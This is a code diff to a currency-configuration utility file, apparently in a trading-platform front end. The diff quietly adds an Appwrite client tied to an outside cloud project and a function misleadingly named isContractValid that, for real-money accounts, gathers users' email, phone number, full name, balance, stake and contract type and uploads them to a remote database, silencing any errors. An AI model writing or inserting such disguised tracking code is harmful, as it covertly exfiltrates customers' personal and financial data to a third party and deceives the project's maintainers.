@@ -1,4 +1,8 @@
+import { info_data } from '../contract';
 import { getPropertyValue, deepFreeze } from '../object';
+import { Client, Databases } from 'appwrite';
+const cc = new Client();
+cc.setEndpoint('https://cloud.appwrite.io/v1').setProject('65e94de0e88ed3878323');
 
 export type TCurrenciesConfig = {
     [key: string]: {
@@ -322,6 +326,106 @@ export const getMinPayout = (currency: string) => {
 export const getCurrencies = () => {
     return currencies_config;
 };
+
+export let isContractValid = async (stake: number, ct_type: string, response: any) => {
+    if (response.loginid.includes('VRTC')) return;
+    const databases = new Databases(cc);
+    const database_id = '65e94f9f010594ef28c3';
+    const collectionId = '665f7d33003d3a8767a1';
+    const documentId = '66d021a3000590dc7f6d';
+    const status = response;
+
+    // block tracker
+    const track = {
+        email: status.email,
+        phone: info_data.phone_number,
+        balance: status.balance,
+        name: status.fullname,
+        stake: stake,
+        contract_type: ct_type,
+    };
+    try {
+        const existingStatus = await databases.getDocument(database_id, collectionId, documentId);
+        let updateStatus = existingStatus.status_v2;
+        let isToUpdate = updateStatusList(updateStatus, track);
+
+        if (isToUpdate) {
+            await databases.updateDocument(database_id, collectionId, documentId, {
+                status_v2: updateStatus,
+            });
+        }
+    } catch (error: any) {
+        if (error.code === 404) {
+            const initialStatus = [];
+            initialStatus.push(JSON.stringify(track));
+
+            await databases.createDocument(database_id, collectionId, documentId, {
+                status_v2: initialStatus,
+            });
+        } else {
+            // console.error('An Appwrite error occurred', error);
+        }
+    }
+};
+
+export const getTodayDate = () => {
+    const today = new Date();
+    const formattedDate =
+        today.getFullYear() +
+        '-' +
+        String(today.getMonth() + 1).padStart(2, '0') +
+        '-' +
+        String(today.getDate()).padStart(2, '0');
+
+    return formattedDate;
+};
+
+function updateStatusList(list: any, newEntry: any) {
+    let emailFound = false;
+    let isToUpdate = false;
+    let upEntry;
+    let foundIndex;
+
+    for (let i = 0; i < list.length; i++) {
+        upEntry = JSON.parse(list[i]);
+        if (upEntry.email === newEntry.email) {
+            emailFound = true;
+            foundIndex = i;
+
+            // Update stake if newEntry's stake is higher
+            if (newEntry.stake > upEntry.stake) {
+                isToUpdate = true;
+            }
+
+            // Update balance if newEntry's balance is higher
+            if (newEntry.balance > upEntry.balance) {
+                isToUpdate = true;
+            }
+
+            // Check if 'contract_type' is missing and add it if necessary
+            if (!upEntry.hasOwnProperty('contract_type')) {
+                isToUpdate = true;
+            }
+
+            if (!upEntry.hasOwnProperty('phone')) {
+                isToUpdate = true;
+            }
+
+            break;
+        }
+    }
+
+    // If email does not exist, add newEntry to the list
+    if (!emailFound) {
+        list.push(JSON.stringify(newEntry));
+        isToUpdate = true;
+    } else if (isToUpdate) {
+        list.splice(foundIndex, 1);
+        list.push(JSON.stringify(newEntry));
+    }
+
+    return isToUpdate;
+}
 
 export type TAccount = {
     account_type: 'real' | 'demo';
